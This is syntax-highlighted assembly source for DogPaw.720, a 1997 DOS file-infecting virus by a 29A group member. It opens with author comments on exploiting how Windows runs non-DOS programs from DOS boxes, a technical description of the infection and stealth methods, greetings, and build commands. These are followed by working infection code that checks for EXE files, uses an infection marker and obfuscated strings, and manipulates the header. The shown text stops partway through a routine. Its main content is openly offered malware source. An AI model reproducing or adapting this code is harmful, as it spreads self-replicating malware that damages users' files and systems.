<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.DogPaw.720 - dogpaw.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                ‹€€€€€‹ ‹€€€€€‹ ‹€€€€€‹</span><span class="sc0">
</span><span class="sc1">;          DogPaw.720                            €€€ €€€ €€€ €€€ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;          by Jacky Qwerty/29A                    ‹‹‹€€ﬂ ﬂ€€€€€€ €€€€€€€</span><span class="sc0">
</span><span class="sc1">;                                                €€€‹‹‹‹ ‹‹‹‹€€€ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;                                                €€€€€€€ €€€€€€ﬂ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This simple DOS virus exploits a certain feature graciosly implemented for</span><span class="sc0">
</span><span class="sc1">; us by Microsoft and which is present in Win95, WinNT and probably OS/2. It</span><span class="sc0">
</span><span class="sc1">; has to  do with non-DOS aplicationz run from  DOS boxez opened under these</span><span class="sc0">
</span><span class="sc1">; 32-bit systemz. It doesnt aply to Win3.1, tho.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; In Win3.1, whenever u try to execute  a Win3.1 aplication  from a DOS box,</span><span class="sc0">
</span><span class="sc1">; the  comon frustratin  mesage "This program  cannot be run in DOS mode" or</span><span class="sc0">
</span><span class="sc1">; "This program requires Microsoft Windows"  apeared.  The guyz at Microsoft</span><span class="sc0">
</span><span class="sc1">; always lookin for  enhancementz finaly made it right with NT and Win95 and</span><span class="sc0">
</span><span class="sc1">; wisely put an end to this nuisance. Under these 32-bit systemz, whenever u</span><span class="sc0">
</span><span class="sc1">; execute a non-DOS aplication  from a  DOS box, the system loader no longer</span><span class="sc0">
</span><span class="sc1">; executes the DOS stub program which displays such mesage, it actually ends</span><span class="sc0">
</span><span class="sc1">; up  executin the real Win3.1 or  Win32 aplication just as if u had double-</span><span class="sc0">
</span><span class="sc1">; clicked  the program on yer desktop to execute it. But what has this thing</span><span class="sc0">
</span><span class="sc1">; got to do with us? Can this feature be used in a virus? the answer is yes.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I wrote this virus just to ilustrate how the above feature can be cleverly</span><span class="sc0">
</span><span class="sc1">; used in a virus.  For this reason,  DogPaw lacks all kindz of poly, retro,</span><span class="sc0">
</span><span class="sc1">; antidebug, etc. but it implements  full stealth tho,  and encrypts data of</span><span class="sc0">
</span><span class="sc1">; the original host, just to anoy AVerz a bit #8P. I'd like to thank "Casio"</span><span class="sc0">
</span><span class="sc1">; from undernet #virus as he seems to be the first one havin exploited this.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Technical description</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; DogPaw is a resident full stealth EXE infector of DOS, Win3.1, Win95, Win-</span><span class="sc0">
</span><span class="sc1">; NT and OS/2 programz. It infects filez on close and execute and disinfects</span><span class="sc0">
</span><span class="sc1">; them on open. I dont like this kind of stealth at all but it was more than</span><span class="sc0">
</span><span class="sc1">; necesary in order to exploit the forementioned feature.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When DogPaw infects a file, it encrypts  the first  720 bytez of the host,</span><span class="sc0">
</span><span class="sc1">; includin its MZ header and stores it at the end of the file, then it over-</span><span class="sc0">
</span><span class="sc1">; writes the first 720 bytez of  the host with  the virus code itself, which</span><span class="sc0">
</span><span class="sc1">; is really DOS program code. This way what the virus really does is conver-</span><span class="sc0">
</span><span class="sc1">; tin Win3.1, Win95, WinNT  and OS/2 programz into  simple DOS programz con-</span><span class="sc0">
</span><span class="sc1">; tainin virus code.  This doesnt mean that such filez are trojanized or da-</span><span class="sc0">
</span><span class="sc1">; maged, they are fully functional after infection, read on.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When a DogPaw-infected file is executed, the system treats it as a genuine</span><span class="sc0">
</span><span class="sc1">; DOS aplication. This is becoz the  virus overwrites the  pointer at 3Ch in</span><span class="sc0">
</span><span class="sc1">; the MZ  header which pointed to  the real NewEXE header (NE, PE, LX, etc).</span><span class="sc0">
</span><span class="sc1">; This way  the virus executes as a DOS 16-bit program and plants a resident</span><span class="sc0">
</span><span class="sc1">; copy in DOS memory. After this the virus has to execute the original apli-</span><span class="sc0">
</span><span class="sc1">; cation, be it a Win3.1, Win32 or an OS/2 program. For this purpose, it di-</span><span class="sc0">
</span><span class="sc1">; sinfects the host  by decryptin the original  data at the end  of file and</span><span class="sc0">
</span><span class="sc1">; writes it back  to the begin of file previosly overwriten with virus code.</span><span class="sc0">
</span><span class="sc1">; Next the virus executes the original host and, becoz of the above feature,</span><span class="sc0">
</span><span class="sc1">; the system finally executes  the original Win3.1, Win32 or OS/2 aplication</span><span class="sc0">
</span><span class="sc1">; just as if it had been executed from outside a DOS box.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The disadvantagez of this method are plain to see. Microsoft obviosly dont</span><span class="sc0">
</span><span class="sc1">; want people to write clumsy DOS programz, tho it is still suportin old DOS</span><span class="sc0">
</span><span class="sc1">; aplicationz from inside its 32-bit systemz. This, acordin to Microsoft, is</span><span class="sc0">
</span><span class="sc1">; needed in order to make the migration from DOS to Win32 less painfully and</span><span class="sc0">
</span><span class="sc1">; troublesome. But once this DOS compatibility disapears from these systemz,</span><span class="sc0">
</span><span class="sc1">; those nonDOS programz infected by this virus wont be able to run or spread</span><span class="sc0">
</span><span class="sc1">; further from inside these 32-bit OS's. As u can see its not wise at all to</span><span class="sc0">
</span><span class="sc1">; still depend on obsolete goofie DOS in order to infect 32-bit aplicationz.</span><span class="sc0">
</span><span class="sc1">; For this purpose we must interact directly with the 32-bit file format, ie</span><span class="sc0">
</span><span class="sc1">; the PE format itself. There is no way to circumvent this in the future ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; A dog paw tale</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; Some weekz ago i stole my dady's car to take a short ride around the block</span><span class="sc0">
</span><span class="sc1">; and  i was so nervous  that i almost crashed twice:  the first time with a</span><span class="sc0">
</span><span class="sc1">; huge big garbage truck  (yea even  tho i wear glasez)  and the second time</span><span class="sc0">
</span><span class="sc1">; with a little grandma crossin down the street.  Shit.. that was enough for</span><span class="sc0">
</span><span class="sc1">; the day, i didnt  want to kill anybody nor get killed at worst, so i deci-</span><span class="sc0">
</span><span class="sc1">; ded to go back home.  I turned on the radio and started to sing "the side-</span><span class="sc0">
</span><span class="sc1">; winder sleeps tonight" by R.E.M.  Yea i was havin a great time  even tho i</span><span class="sc0">
</span><span class="sc1">; had been about to crash twice.  Why did i have to open my mouth! Just when</span><span class="sc0">
</span><span class="sc1">; i was about to turn right at the next block i heard a suden "crash" follo-</span><span class="sc0">
</span><span class="sc1">; wed by two "squeeze.." "squeeze.." feelin two "up-and-down's" on the right</span><span class="sc0">
</span><span class="sc1">; tirez.  Shit what da hell was that..?  i looked back thru the front mirror</span><span class="sc0">
</span><span class="sc1">; just to know the answer. On the road i had left behind,  there lied a poor</span><span class="sc0">
</span><span class="sc1">; crushed dog.  Ohh shit i crushed a dog!  Now from  time to time  when that</span><span class="sc0">
</span><span class="sc1">; scene comes to my mind,  all i see is that unfortunate  squeezed dog wavin</span><span class="sc0">
</span><span class="sc1">; goodbye with his paw.. the poor dog paw. #8I</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Greetingz</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; And finaly the greetingz go to:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Casio ......... Yer Rusty was kewl.. but throw 'way that ASIC dude!</span><span class="sc0">
</span><span class="sc1">;   Tcp/29A ....... Wooow! yer disasembliez rock man.. really rock!</span><span class="sc0">
</span><span class="sc1">;   Spanska ....... Dont get drunk too often ;) greetingz to Elvira..</span><span class="sc0">
</span><span class="sc1">;   Reptile/29A ... Not even a garden full of ganja can stop ya heh #8S</span><span class="sc0">
</span><span class="sc1">;   Rilo .......... Confess budie: Rilo Drunkie + Belch = Car crash ;)</span><span class="sc0">
</span><span class="sc1">;   Liquiz ........ Still watin to see that poly of yourz.. #8)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Disclaimer</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; This source code is for  educational purposez only. The author is not res-</span><span class="sc0">
</span><span class="sc1">; ponsible for any problemz caused due to the assembly of this file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Compiling it</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; tasm -ml -m5 -q -zn dogpaw.asm</span><span class="sc0">
</span><span class="sc1">; tlink -t -x dogpaw, dogpaw.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (c) 1997 Jacky Qwerty/29A.</span><span class="sc0">


</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">MZ.inc</span><span class="sc0">

</span><span class="sc5">v_mark</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'GD'</span><span class="sc0">                         </span><span class="sc1">;virus mark</span><span class="sc0">
</span><span class="sc5">v_size_bytes</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">v_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_start</span><span class="sc0">              </span><span class="sc1">;virus size in bytez</span><span class="sc0">
</span><span class="sc5">b_size_bytes</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">v_size_bytes</span><span class="sc0">                 </span><span class="sc1">;bufer size in bytez</span><span class="sc0">
</span><span class="sc5">s_size_bytes</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">                         </span><span class="sc1">;stack size in bytez</span><span class="sc0">
</span><span class="sc5">v_size_words</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">v_size_bytes</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">;virus size in wordz</span><span class="sc0">
</span><span class="sc5">v_size_paras</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">v_size_bytes</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">     </span><span class="sc1">;virus size in paragraphz</span><span class="sc0">
</span><span class="sc5">v_size_sects</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">v_size_bytes</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">511</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">   </span><span class="sc1">;virus size in sectorz</span><span class="sc0">
</span><span class="sc5">v_size_kilos</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">v_size_bytes</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1023</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc1">;virus size in kilobytez</span><span class="sc0">
</span><span class="sc5">v_size_div_512</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">v_size_bytes</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">           </span><span class="sc1">;virus size div 512</span><span class="sc0">
</span><span class="sc5">v_size_mod_512</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">v_size_bytes</span><span class="sc0">    \            </span><span class="sc1">;virus size mod 512</span><span class="sc0">
                        </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">512</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc5">v_size_div_512</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">m_size_bytes</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">v_size_bytes</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">b_start</span><span class="sc0"> \    </span><span class="sc1">;memory size in bytez</span><span class="sc0">
                        </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">b_size_bytes</span><span class="sc0"> \    </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">s_size_bytes</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">m_size_words</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">m_size_bytes</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">;memory size in wordz</span><span class="sc0">
</span><span class="sc5">m_size_paras</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">m_size_bytes</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">     </span><span class="sc1">;memory size in paragraphz</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">v_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">MZ_Header</span><span class="sc0">       </span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0">                     \ </span><span class="sc1">;MZ header start</span><span class="sc0">
                        </span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc4">,</span><span class="sc0">            \ </span><span class="sc1">;MZ_magic</span><span class="sc0">
                        </span><span class="sc5">v_size_mod_512</span><span class="sc4">,</span><span class="sc0">                 \ </span><span class="sc1">;MZ_cblp</span><span class="sc0">
                        </span><span class="sc5">v_size_sects</span><span class="sc4">,</span><span class="sc0">                   \ </span><span class="sc1">;MZ_cp</span><span class="sc0">
                        </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">                              \ </span><span class="sc1">;MZ_crlc</span><span class="sc0">
                        </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">                              \ </span><span class="sc1">;NZ_cparhdr</span><span class="sc0">
                        </span><span class="sc5">m_size_paras</span><span class="sc4">,</span><span class="sc0">                   \ </span><span class="sc1">;MZ_minalloc</span><span class="sc0">
                        </span><span class="sc5">m_size_paras</span><span class="sc4">,</span><span class="sc0">                   \ </span><span class="sc1">;MZ_maxalloc</span><span class="sc0">
                        </span><span class="sc4">-</span><span class="sc2">11h</span><span class="sc4">,</span><span class="sc0">                           \ </span><span class="sc1">;MZ_ss</span><span class="sc0">
                        </span><span class="sc4">(</span><span class="sc5">m_size_bytes</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">111h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">    \ </span><span class="sc1">;MZ_sp</span><span class="sc0">
                        </span><span class="sc5">v_mark</span><span class="sc4">,</span><span class="sc0">                         \ </span><span class="sc1">;MZ_csum</span><span class="sc0">
                        </span><span class="sc5">entry_point</span><span class="sc4">,</span><span class="sc0">                    \ </span><span class="sc1">;MZ_ip</span><span class="sc0">
                        </span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc0">                            \ </span><span class="sc1">;MZ_cs</span><span class="sc0">
                </span><span class="sc4">&gt;</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">v_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MZ_lfarlc</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">old_MZ_low_ptr</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">old_MZ_high_ptr</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">c_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Copyright</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'D'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'o'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'g'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'P'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'w'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' '</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'J'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'x'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Q'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'/'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'2'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'9'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">

</span><span class="sc5">common_clean_ds</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">flag</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">common_clean</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">;clear carry (clean file)</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">common_infect</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">;set carry (infect file)</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clean</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc9">common</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc5">@endsz</span><span class="sc0">
                </span><span class="sc6">std</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc12">'E'</span><span class="sc0">         </span><span class="sc1">;check for EXE extension</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">to_popa_ret</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">2020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc12">'XE'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">to_popa_ret</span><span class="sc0">

</span><span class="sc9">common</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;this function cleans or infects a file</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  flag = 0, if error</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">     </span><span class="sc1">;open file in read/only mode</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">to_popa_ret</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ptr2begin</span><span class="sc0">       </span><span class="sc1">;move file pointer to begin of file</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_close</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">            </span><span class="sc1">;read first 720 bytez</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_close</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.MZ_csum</span><span class="sc4">],</span><span class="sc5">v_mark</span><span class="sc0">    </span><span class="sc1">;check infection</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">end_close_clc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">si.MZ_magic</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.MZ_maxalloc</span><span class="sc4">],</span><span class="sc5">m_size_paras</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">end_close_clc</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">         </span><span class="sc1">;check MZ signature</span><span class="sc0">
 </span><span class="sc5">end_close_clc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">clc</span><span class="sc0">
     </span><span class="sc5">end_close</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">     </span><span class="sc1">;close file</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">lahf</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">sahf</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">end_popa_ret</span><span class="sc0">    </span><span class="sc1">;if (carry or zero)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">        </span><span class="sc1">;save old file atributes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">
